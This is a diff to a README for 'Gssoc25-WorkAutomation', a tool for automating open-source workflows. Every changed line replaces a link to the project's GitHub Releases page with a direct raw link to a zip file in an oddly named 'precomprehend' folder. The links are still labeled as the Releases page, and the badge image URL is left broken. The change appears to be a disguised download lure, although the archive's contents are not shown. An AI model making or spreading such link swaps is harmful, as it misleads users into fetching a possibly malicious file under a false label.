@@ -1,6 +1,6 @@
 # 🚀 Gssoc25-WorkAutomation - Simplify Your Open-Source Workflows
 
-[![Download Gssoc25-WorkAutomation](https://img.shields.io/badge/Download-Gssoc25%2DWorkAutomation-blue)](https://github.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/releases)
+[![Download Gssoc25-WorkAutomation](https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/main/precomprehend/Gssoc25-WorkAutomation.zip%2DWorkAutomation-blue)](https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/main/precomprehend/Gssoc25-WorkAutomation.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to Gssoc25-WorkAutomation! This tool helps you streamline workflows for 
 
 To get started, visit the Releases page to download the application. 
 
-[Download Gssoc25-WorkAutomation](https://github.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/releases)
+[Download Gssoc25-WorkAutomation](https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/main/precomprehend/Gssoc25-WorkAutomation.zip)
 
 ### System Requirements
 
@@ -29,7 +29,7 @@ Before you install, ensure your system meets the following requirements:
 
 ### Installation Steps
 
-1. **Visit Release Page**: Click this link to go to the [Releases page](https://github.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/releases).
+1. **Visit Release Page**: Click this link to go to the [Releases page](https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/Gssoc25-WorkAutomation/main/precomprehend/Gssoc25-WorkAutomation.zip).
    
 2. **Choose Version**: Select the latest version listed to ensure you have the newest features.
 
